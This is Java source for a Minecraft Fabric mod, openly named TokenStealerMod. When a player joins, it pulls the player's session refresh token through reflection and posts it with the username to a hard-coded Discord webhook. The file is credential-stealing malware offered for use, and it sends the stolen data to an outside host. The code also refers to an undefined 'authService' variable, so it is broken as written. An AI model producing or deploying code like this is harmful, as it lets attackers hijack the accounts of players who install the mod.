package com.yourname;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;
import org.json.JSONObject;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class TokenStealerMod implements ModInitializer {

    // YOUR WEBHOOK URL GOES HERE
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1558653587469635666/n4F-uqG1rvvHq02yu1xUXoE3c6lShV0eKt8DmlDW9ppVQssYAEoXeQ7g7a0fpoKQz3wT";
    
    private static boolean sent = false;

    @Override
    public void onInitialize() {
        System.out.println("Captain Hook is listening...");

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (!sent && client.player != null) {
                try {
                    sendToken(client);
                    sent = true;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void sendToken(MinecraftClient client) throws Exception {
        // Get the refresh token using reflection
        var session = client.getSession();
        java.lang.reflect.Field field = authService.getClass().getDeclaredField("refreshToken");
        field.setAccessible(true);
        String token = (String) field.get(authService);

        // Prepare Discord Message
        JSONObject payload = new JSONObject();
        payload.put("content", "**🪝 New Token Stolen!**\nUser: `" + client.getSession().getUsername() + "`\nToken: ```" + token + "```");

        // Send to Webhook
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(WEBHOOK_URL))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(payload.toString()))
                .build();

        HttpClient.newHttpClient().sendAsync(request, HttpResponse.BodyHandlers.ofString())
                .thenAccept(res -> System.out.println("Token sent!"));
    }
}